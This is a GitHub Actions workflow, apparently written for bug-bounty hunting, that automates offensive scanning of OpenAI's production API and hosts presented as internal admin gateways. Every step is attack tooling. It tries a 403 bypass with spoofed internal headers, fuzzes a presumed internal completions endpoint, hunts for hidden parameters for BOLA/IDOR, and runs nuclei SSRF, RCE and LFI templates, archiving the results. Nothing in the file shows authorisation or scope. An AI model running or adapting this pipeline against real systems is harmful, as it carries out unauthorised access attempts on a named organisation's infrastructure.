name: OpenAI-Complete-Goldmine-Hunter
on:
  workflow_dispatch:

jobs:
  exploit-hunt:
    runs-on: ubuntu-latest
    steps:
      - name: Checkout
        uses: actions/checkout@v4

      - name: Install Advanced Arsenal
        run: |
          go install -v github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest
          go install -v github.com/projectdiscovery/httpx/cmd/httpx@latest
          go install -v github.com/projectdiscovery/katana/cmd/katana@latest
          go install -v github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest
          go install -v github.com/ffuf/ffuf/v2@latest
          pip install arjun
          sudo mv ~/go/bin/* /usr/local/bin/

      - name: Phase 1:API Gateway Bypass Testing
        run: |
          # Targeting the specific unified gateways and internal paths
          echo "https://api.openai.com/v1/completionsinternal" > targets.txt
          echo "https://admin.unified-8.api.openai.com" >> targets.txt
          echo "https://higherlevelapi.unified-8.api.openai.com" >> targets.txt
          
          # HTTPX testing for 403 bypass using internal headers
          httpx -l targets.txt -H "X-Forwarded-For: 127.0.0.1" -H "X-OpenAI-Internal: true" -H "X-Admin: true" -sc -title -o bypass_results.txt

      - name: Phase 2:POST Verb & JSON Fuzzing (The "404" Killer)
        run: |
          # Fuzzing for the correct model name or internal parameter that triggers the API
          # We use a POST request because internal completion APIs rarely support GET
          ffuf -u "https://api.openai.com/v1/completionsinternal" -X POST \
          -H "Content-Type: application/json" \
          -d '{"model": "FUZZ", "prompt": "hi"}' \
          -w /usr/share/dict/words -mc 200,401,403,500 -o api_fuzz_results.json || true

      - name: Phase 3:Forced Parameter Discovery (BOLA/IDOR Hunt)
        run: |
          # Arjun is forced to use POST mode to find hidden organization/user parameters
          arjun -u "https://api.openai.com/v1/completionsinternal" -m POST --rate-limit 2 -oJ "params_discovery.json" || true
          
          # Checking admin gateways for hidden 'debug' or 'internal' flags
          arjun -u "https://admin.unified-8.api.openai.com" -m GET --rate-limit 2 -oJ "admin_params.json" || true

      - name: Phase 4:SSRF & RCE Nuclei Scan
        run: |
          # Specific templates for Out-of-Band (OOB) and Server Side Request Forgery
          # If completionsinternal can reach an external server, it is a massive bounty
          nuclei -l targets.txt -tags ssrf,oast,blind-idor,rce,lfi -severity critical,high -rl 5 -o nuclei_results.txt || true

      - name: Archive Critical Evidence
        uses: actions/upload-artifact@v4
        with:
          name: openai-api-gold-results
          path: |
            nuclei_results.txt
            api_fuzz_results.json
            params_discovery.json
            admin_params.json
            bypass_results.txt
            
